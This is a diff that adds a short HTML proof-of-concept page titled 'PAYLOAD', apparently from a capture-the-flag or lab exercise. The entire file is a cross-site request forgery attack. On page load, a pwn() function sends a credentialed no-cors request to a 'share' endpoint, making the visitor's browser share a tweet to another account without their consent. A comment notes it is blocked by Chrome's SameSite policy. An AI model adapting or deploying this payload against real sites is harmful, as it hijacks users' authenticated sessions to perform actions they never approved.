@@ -1,0 +1,19 @@
+<html lang="en">
+<head>
+    <title>PAYLOAD</title>
+</head>
+<body>
+<script>
+    // Warning: Doesn't work in Chrome because of the SameSite policy.
+    function pwn() {
+        fetch('http://backend:4321/share?tweet_id=1&to_user=test1234', {
+            method: 'HEAD',
+            credentials: 'include',
+            mode: 'no-cors'
+        }).catch(err => console.log(err)).then(x => console.log(x));
+    }
+
+    pwn()
+</script>
+</body>
+</html>
